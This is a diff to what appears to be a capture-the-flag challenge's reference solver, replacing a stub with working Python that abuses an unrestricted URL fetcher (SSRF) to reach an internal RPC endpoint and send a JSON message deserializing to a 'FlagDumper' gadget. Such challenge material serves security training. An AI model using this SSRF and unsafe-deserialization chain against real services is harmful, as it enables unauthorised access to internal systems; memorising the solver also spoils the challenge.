@@ -1,14 +1,26 @@
 #!/usr/bin/env python3
-"""Reference solver for misc-ingestd-deser -- STUB. TODO: implement the exploit chain and
-print the recovered flag.
+"""Reference solver for misc-ingestd-deser.
+
+The fetcher does not restrict its target, so SSRF it at the internal RPC and
+send a poisoned message that deserializes to the FlagDumper gadget.
 
     python3 solve.py http://HOST:PORT
 """
+import json
 import sys
+import urllib.parse
+import urllib.request
+
+
+def _get(url):
+    return json.loads(urllib.request.urlopen(url, timeout=10).read())
 
 
 def solve(base):
-    raise SystemExit("solver not implemented for misc-ingestd-deser")
+    base = base.rstrip("/")
+    body = urllib.parse.quote(json.dumps({"__class__": "FlagDumper"}))
+    out = _get(base + "/fetch?url=/internal/rpc&body=" + body)
+    return out["result"]
 
 
 if __name__ == "__main__":
